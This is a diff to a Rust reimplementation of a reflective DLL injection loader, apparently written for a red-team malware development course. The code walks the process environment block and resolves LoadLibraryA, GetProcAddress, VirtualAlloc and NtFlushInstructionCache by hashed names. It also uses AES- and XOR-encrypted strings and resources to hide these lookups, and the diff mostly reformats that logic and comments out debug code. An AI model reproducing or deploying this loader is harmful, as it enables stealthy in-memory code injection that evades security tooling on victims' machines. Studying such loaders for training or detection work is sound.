@@ -1,15 +1,17 @@
 //my rust implementation of https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c
 #![allow(non_snake_case)]
 
-use crate::util::{get_dll_base, get_resource_bytes};
+use crate::crypto_util::{
+    get_aes_encrypted_resource_bytes, get_aes_encrypted_resource_bytes_unmapped,
+    get_xor_encrypted_string, get_xor_encrypted_string_unmapped,
+};
+use crate::hash::{hash, hash_case_insensitive};
+use crate::util::{get_dll_base, get_resource_bytes, get_unmapped_resource_bytes};
 use crate::winapi::get_peb;
 use crate::winternals::*;
 use std::mem::size_of;
 use std::ptr::addr_of;
 use std::{fs, mem};
-use crate::consts::*;
-use crate::crypto_util::{get_aes_encrypted_resource_bytes, get_aes_encrypted_resource_bytes_unmapped, get_xor_encrypted_string, get_xor_encrypted_string_unmapped};
-use crate::hash::{hash, hash_case_insensitive};
 
 const KERNEL32DLL_HASH: u32 = 0x6A4ABC5B;
 const NTDLLDLL_HASH: u32 = 0x3CFA685D;
@@ -26,15 +28,14 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
     let pLibraryAddress = get_dll_base();
 
     // if debugging from library tests, use a copy of the file loaded into memory, as the dll base.
-    let pLibraryAddress = fs::read(
-        r"C:\Users\Nord\source\Hacking\Sektor7\RTO-MDI\03.Assignment\reflective-dll\target\debug\dyload.dll",
-    ).unwrap();
-    let pLibraryAddress = pLibraryAddress.as_ptr() as usize;
+    // let pLibraryAddress = fs::read(
+    //     r"C:\Users\Nord\source\Hacking\Sektor7\RTO-MDI\03.Assignment\reflective-dll\target\debug\dyload.dll",
+    // ).unwrap();
+    // let pLibraryAddress = pLibraryAddress.as_ptr() as usize;
 
     // STEP 1: process the kernels exports for the functions our loader needs...
     // get the Process Environment Block
     let peb = get_peb();
-
     let pLdr = (*peb).Ldr;
     let mut pModuleList = (*pLdr).InMemoryOrderModuleList.Flink;
 
@@ -54,8 +55,37 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
         // clear uiValueC which will store the hash of the module name
         let dwModuleHash = hash_case_insensitive(pBuffer, usCounter);
 
-        //const KERNEL32DLL_HASH: u32 = 0x6A4ABC5B;
-        //const NTDLLDLL_HASH: u32 = 0x3CFA685D;
+        // let KERNEL32DLL_HASH = get_xor_encrypted_string_unmapped(
+        //     KERNEL32_DLL_HASH_POS,
+        //     KERNEL32_DLL_HASH_KEY,
+        //     KERNEL32_DLL_HASH_LEN,
+        // );
+        // let NTDLLDLL_HASH = get_xor_encrypted_string_unmapped(
+        //     KERNEL32_DLL_HASH_POS,
+        //     KERNEL32_DLL_HASH_KEY,
+        //     KERNEL32_DLL_HASH_LEN,
+        // );
+
+        // TEMP DEBUG
+        // let loadLibrary = GetProcAddress(
+        //     GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        //     "LoadLibraryA".as_bytes(),
+        // );
+        // let loadLibrary: LoadLibraryA = mem::transmute(loadLibrary);
+        // let mut user32 = "USER32.dll".as_bytes().to_vec();
+        // user32.push(0);
+        // loadLibrary(user32.as_ptr());
+        //
+        // let window: MessageBoxA = mem::transmute(GetProcAddress(
+        //     GetModuleHandle("USER32.dll".as_bytes().to_vec()),
+        //     "MessageBoxA".as_bytes(),
+        // ));
+        // window(
+        //     0,
+        //     "Hello from self loader!\0".as_ptr(),
+        //     "Reflective Dll Injection\0".as_ptr(),
+        //     MB_OK,
+        // );
 
         // compare the hash with that of kernel32.dll
         if dwModuleHash == KERNEL32DLL_HASH {
@@ -96,38 +126,38 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
             // let GETPROCADDRESS_HASH = get_aes_encrypted_resource_bytes_unmapped(GETPROCADDRESS_HASH_POS,GETPROCADDRESS_HASH_LEN);
             // let VIRTUALALLOC_HASH = get_aes_encrypted_resource_bytes_unmapped(VIRTUALALLOC_HASH_POS,VIRTUALALLOC_HASH_LEN);
 
-                for i in 0..sNameArray.len() {
-                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
+            for i in 0..sNameArray.len() {
+                let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
 
-                    if dwHashValue == LOADLIBRARYA_HASH
-                        || dwHashValue == GETPROCADDRESS_HASH
-                        || dwHashValue == VIRTUALALLOC_HASH
-                    {
-                        // get the VA for the array of addresses
-                        let mut uiAddressArray =
-                            lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;
+                if dwHashValue == LOADLIBRARYA_HASH
+                    || dwHashValue == GETPROCADDRESS_HASH
+                    || dwHashValue == VIRTUALALLOC_HASH
+                {
+                    // get the VA for the array of addresses
+                    let mut uiAddressArray =
+                        lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;
 
-                        // use this functions name ordinal as an index into the array of name pointers
-                        uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();
+                    // use this functions name ordinal as an index into the array of name pointers
+                    uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();
 
-                        //cast to a u32 pointer, for readability.
-                        let pAddressRVA = uiAddressArray as *const u32;
+                    //cast to a u32 pointer, for readability.
+                    let pAddressRVA = uiAddressArray as *const u32;
 
-                        // store this functions VA
-                        if dwHashValue == LOADLIBRARYA_HASH {
-                            pLoadLibraryA = lpBaseAddress + *pAddressRVA as usize;
-                        } else if dwHashValue == GETPROCADDRESS_HASH {
-                            pGetProcAddress = lpBaseAddress + *pAddressRVA as usize;
-                        } else if dwHashValue == VIRTUALALLOC_HASH {
-                            pVirtualAlloc = lpBaseAddress + *pAddressRVA as usize;
-                        }
+                    // store this functions VA
+                    if dwHashValue == LOADLIBRARYA_HASH {
+                        pLoadLibraryA = lpBaseAddress + *pAddressRVA as usize;
+                    } else if dwHashValue == GETPROCADDRESS_HASH {
+                        pGetProcAddress = lpBaseAddress + *pAddressRVA as usize;
+                    } else if dwHashValue == VIRTUALALLOC_HASH {
+                        pVirtualAlloc = lpBaseAddress + *pAddressRVA as usize;
+                    }
 
-                        usCounter -= 1;
-                        if usCounter == 0 {
-                            break;
-                        }
+                    usCounter -= 1;
+                    if usCounter == 0 {
+                        break;
                     }
                 }
+            }
         } else if dwModuleHash == NTDLLDLL_HASH {
             // get this modules base address
             let lpBaseAddress = (*pTruncLdrTableDataEntry).DllBase;
@@ -165,30 +195,30 @@ pub unsafe extern "C" fn ReflectiveLoader(lpParameter: *mut usize) -> usize {
             //let NTFLUSHINSTRUCTIONCACHE_HASH = get_aes_encrypted_resource_bytes_unmapped(NTFLUSHINSTRUCTIONCACHE_HASH_POS,NTFLUSHINSTRUCTIONCACHE_HASH_LEN);
 
             for i in 0..sNameArray.len() {
-                    let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
+                let dwHashValue = hash(lpBaseAddress + sNameArray[i] as usize);
 
+                if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
+                    // get the VA for the array of addresses
+                    let mut uiAddressArray =
+                        lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;
+
+                    // use this functions name ordinal as an index into the array of name pointers
+                    uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();
+
+                    //cast to a u32 pointer, for readability.
+                    let pAddressRVA = uiAddressArray as *const u32;
+
+                    // store this functions VA
                     if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
-                        // get the VA for the array of addresses
-                        let mut uiAddressArray =
-                            lpBaseAddress + (*uiExportDir).AddressOfFunctions as usize;
+                        pNtFlushInstructionCache = lpBaseAddress + *pAddressRVA as usize;
+                    }
 
-                        // use this functions name ordinal as an index into the array of name pointers
-                        uiAddressArray += sNameOrdinals[i] as usize * size_of::<u32>();
-
-                        //cast to a u32 pointer, for readability.
-                        let pAddressRVA = uiAddressArray as *const u32;
-
-                        // store this functions VA
-                        if dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH {
-                            pNtFlushInstructionCache = lpBaseAddress + *pAddressRVA as usize;
-                        }
-
-                        usCounter -= 1;
-                        if usCounter == 0 {
-                            break;
-                        }
+                    usCounter -= 1;
+                    if usCounter == 0 {
+                        break;
                     }
                 }
+            }
         }
 
         // we stop searching when we have found everything we need.
@@ -426,4 +456,3 @@ fn get_offset(bitfield: u16) -> usize {
 fn get_type(bitfield: u16) -> u16 {
     bitfield >> 12
 }
-
